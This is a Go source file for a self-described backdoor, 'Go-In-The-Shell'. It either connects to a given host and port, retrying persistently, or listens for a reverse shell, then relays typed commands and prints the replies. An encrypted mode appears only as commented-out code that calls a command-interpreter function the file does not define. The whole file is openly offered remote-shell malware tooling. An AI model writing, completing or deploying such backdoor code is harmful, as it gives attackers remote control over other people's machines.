package main

import (
	"os"
	"fmt"
	"net"
	"time"
	"bufio"
	//"strings"
	"crypto/rsa"
	"crypto/rand"
	"crypto/sha256"
	//"encoding/gob"
)

func Banner() {
	fmt.Println(",---.        |        --.--|            ,---.|         |    |    ")
	fmt.Println("|  _.,---.   |,---.     |  |---.,---.   `---.|---.,---.|    |    ")
	fmt.Println("|   ||   |---||   |---  |  |   ||---'---    ||   ||---'|    |    ")
	fmt.Println("`---'`---'   ``   '     `  `   '`---'   `---'`   '`---'`---'`---'")
	fmt.Println("\nGo-In-The-Shell is a flexible and userfriendly backdoor")
}

func KeyGen() (rsa.PublicKey, rsa.PrivateKey) {
	// key generation
	priv_key, err := rsa.GenerateKey(rand.Reader, 4096)
	if err != nil {
		fmt.Println("Could not generate Keys")
		os.Exit(1)
	}
	pub_key := priv_key.PublicKey
	return pub_key, *priv_key
}

func split(tosplit string, sep rune) []string {
	//string splitting function

	var fields []string
	last := 0
	
	for i,c := range tosplit {
        	if c == sep {
        	// Found the separator, append a slice
        	fields = append(fields, string(tosplit[last:i]))
        	last = i + 1
		}
	}

	// Don't forget the last field
	fields = append(fields, string(tosplit[last:]))

	return fields
}

func Encryption(message string, distant_pub_key rsa.PublicKey) string {
	//Encrypt outgoing data
	data := []byte(message)
	rng := rand.Reader

	ciphertext, err := rsa.EncryptOAEP(sha256.New(), rng, &distant_pub_key, data, nil)
	if err != nil {
		fmt.Printf("Error from encryption: %s\n", err)
		return "Encryption error"
	}
	return string(ciphertext)
}

func Decryption(message string, local_priv_key rsa.PrivateKey) string {
	//Decrypt incoming data
	data := []byte(message)
	rng := rand.Reader

	plaintext, err := rsa.DecryptOAEP(sha256.New(), rng, &local_priv_key, data, nil)
	if err != nil {
		fmt.Println("Decryption error : a user must've disconnected himself")
		return "Decryption error"
	}
	return string(plaintext)
}
/*
func EncryptedConnectionHandler(connection net.Conn, local_pub_key rsa.PublicKey, local_priv_key rsa.PrivateKey, connect bool){
	//A goroutine to receive data from distants

	//We use gob encoding in order to transmit and receive data safely
	enc := gob.NewEncoder(connection)
	dec := gob.NewDecoder(connection)

	if connect == true {
		var distant_pub_key = rsa.PublicKey{}
		//Big dumb key exchange
		enc.Encode(&local_pub_key)
		dec.Decode(&distant_pub_key)
	} else {
		//Big dumb key exchange
		var distant_pub_key = rsa.PublicKey{}
		dec.Decode(&distant_pub_key)
		enc.Encode(&local_pub_key)
	}

	for {
		var command string
		dec.Decode(&command)
		output := InterpretCommand(Decryption(command, local_priv_key))
		enc.Encode(Encryption(output, distant_pub_key))
	}
	connection.Close()
}*/

func NormalConnectionHandler(connection net.Conn) {
	server, _ := bufio.NewReader(connection).ReadString('\000')
	fmt.Printf(server)
	//A goroutine to receive data from distants
	for {
		scanner := bufio.NewScanner(os.Stdin)
		scanner.Scan()
		fmt.Fprintf(connection, scanner.Text()+"\n")
		server, _ := bufio.NewReader(connection).ReadString('\000')
		fmt.Printf(server)
	}
	connection.Close()
}

func Connect(ip_port string, encrypted bool) {
	//Connection for bind shell
	var connection net.Conn
	var err error
	for {
		connection, err = net.Dial("tcp", ip_port)
		if err == nil {
			break
		}
		time.Sleep(5 * time.Second)
	}
	
	NormalConnectionHandler(connection)
	/*
	if encrypted == true {
		local_pub_key, local_priv_key := KeyGen()
		EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, true)
	} else {
		NormalConnectionHandler(connection)
	}
	*/
}

func Listen(ip_port string, encrypted bool) {
	//Listen for reverse shell
	listener, err := net.Listen("tcp", ip_port)
	if err != nil {
		fmt.Printf("Could not start listener: %s\n", err)
		os.Exit(1)
	}
	defer listener.Close()

	for {
		connection, err := listener.Accept()
		if err != nil {
			fmt.Println("Could not Accept connection")
		}
		NormalConnectionHandler(connection)
	/*
		if encrypted == true {
			local_pub_key, local_priv_key := KeyGen()
			EncryptedConnectionHandler(connection, local_pub_key, local_priv_key, false)
		} else {
			NormalConnectionHandler(connection)
		}
		*/
	}
}

func main(){
	Banner()
	arguments := os.Args

	if len(arguments) == 1 {
			Banner()
			fmt.Println("Please provide arguments")
			fmt.Println("gits -r <IP:PORT> : reach to given host")
			fmt.Println("gits -l <IP:PORT> : listen on given port")

			fmt.Println("\nYou must use our other tool in order to use encryption")
			fmt.Println("add -e at the end of the command for encrypted connection")
			os.Exit(1)
	}

	if arguments[1] == "-l" {
		if arguments[len(arguments)-1] == "-e" {
			Listen(arguments[2], true)
		} else {
			Listen(arguments[2], false)
		}
	} else if arguments[1] == "-r" {
		if arguments[len(arguments)-1] == "-e" {
			Connect(arguments[2], true)
		} else {
			Connect(arguments[2], false)
		}
	}
}